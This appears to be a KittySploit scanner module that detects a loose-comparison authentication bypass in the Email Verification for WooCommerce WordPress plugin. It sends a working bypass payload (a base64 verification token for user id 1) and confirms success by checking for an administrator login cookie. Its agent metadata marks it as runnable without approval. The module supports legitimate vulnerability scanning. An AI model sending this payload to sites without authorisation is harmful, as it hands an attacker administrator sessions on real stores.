#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Email Verification for WooCommerce Wordpress plugin prior to version 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass Detection',
        'description': 'Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2 contains a loose comparison issue which could allow any user to log in as administrator.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'woocommerce', 'wp', 'wpscan', 'wordpress', 'wp-plugin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpvulndb.com/vulnerabilities/10318',
            'https://wpscan.com/vulnerability/0c93832c-83db-4053-8a11-70de966bb3a8',
        ],
    }

    def run(self):
        for path in ('/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=', '/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0='):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('Your account has been activated!', 'From your account dashboard you can view your',)
            header_regexes = ('wordpress_logged_in_[a-z0-9]{32}',)
            if (all(m in body for m in body_all)) and (any(re.search(rx, headers, 0) for rx in header_regexes)):
                self.set_info(
                    severity='critical',
                    reason="Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass detected",
                    path=path,
                )
                return True
        return False

